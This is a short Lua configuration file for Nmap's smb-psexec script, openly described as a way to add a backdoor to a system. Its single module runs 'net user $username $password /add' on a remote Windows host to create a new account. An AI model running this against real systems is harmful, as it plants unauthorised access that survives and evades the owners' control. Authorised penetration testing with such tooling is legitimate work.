---This config file is designed for adding a backdoor to the system. It has a few
-- options by default, only one enabled by default. I suggest 
--
-- Note that none of these modules are included with Nmap by default. 

-- Any variable in the 'config' table in smb-psexec.nse can be overriden in the
-- 'overrides' table. Most of them are not really recommended, such as the host,
-- key, etc.
overrides = {}
--overrides.timeout = 40

modules = {}
local mod

-- TODO: allow the user to specify parameters
--Note: password can't be longer than 14-characters, otherwise the program pauses for
-- a response
mod = {}
mod.upload           = false
mod.name             = "Adding a user account: $username/$password" 
mod.program          = "net"
mod.args             = "user $username $password /add"
mod.maxtime          = 2
mod.noblank          = true
mod.req_args         = {'username','password'}
table.insert(modules, mod)

